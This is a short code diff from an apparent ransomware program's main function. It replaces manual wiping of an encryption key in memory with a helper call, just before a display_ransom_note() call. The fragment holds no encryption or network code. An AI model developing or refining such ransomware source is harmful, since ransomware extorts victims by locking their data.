@@ -49,9 +49,7 @@ int main() {
 		return OPERATION_FAILED;
 	}
 
-	SecureZeroMemory(key.data(), key.size());
-	key.clear();
-	key.shrink_to_fit();
+	erase_data_from_memory(key);
 
 
 	display_ransom_note();
